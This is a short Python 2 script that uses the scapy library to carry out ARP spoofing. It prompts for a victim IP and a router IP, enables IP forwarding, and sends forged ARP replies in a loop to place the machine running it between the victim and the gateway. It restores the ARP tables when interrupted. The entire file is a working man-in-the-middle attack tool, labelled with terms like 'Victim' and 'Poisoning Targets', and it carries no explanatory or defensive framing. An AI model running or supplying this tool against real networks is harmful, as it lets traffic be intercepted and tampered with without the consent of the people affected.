#!/usr/bin/python

from scapy.all import *
import sys
import os
import time

try:
    interface = raw_input("[*] Enter Desired Interface: ")
    victim_ip = raw_input("[*] Enter Victim IP: ")
    gateway_ip = raw_input("[*] Enter Router IP: ")

except KeyboardInterrupt:
    print "\n[*] User Requested Shutdown"
    print "[*] Exiting ..."
    sys.exit(1)

print "\n[*] Enabling IP forwarding ...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")



def re_ARP():
    print "\n[*] Restoring Targets..."
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count = 7)
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst= "ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count = 7)
    print "[*] Disabling IP forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "[*] Shutting Down..."
    sys.exit(1)


def trick(gm, vm):
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=vm))
    send(ARP(op=2, pdst = gateway_ip, psrc=victim_ip, hwdst=gm))




def main():
    
    try:
        victim_mac= get_mac(victim_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't find Victim MAC Address"
        print "[!] Exiting ..."
        sys.exit(1)
    try:
        gateway_mac = get_mac(gateway_ip)

    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't find Gateway MAC Address"
        print "[!] Exiting..."
        sys.exit(1)

    print "[*] Poisoning Targets..."

    while 1:
        try:
            trick(gateway_mac, victim_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            re_ARP()
            break


main()



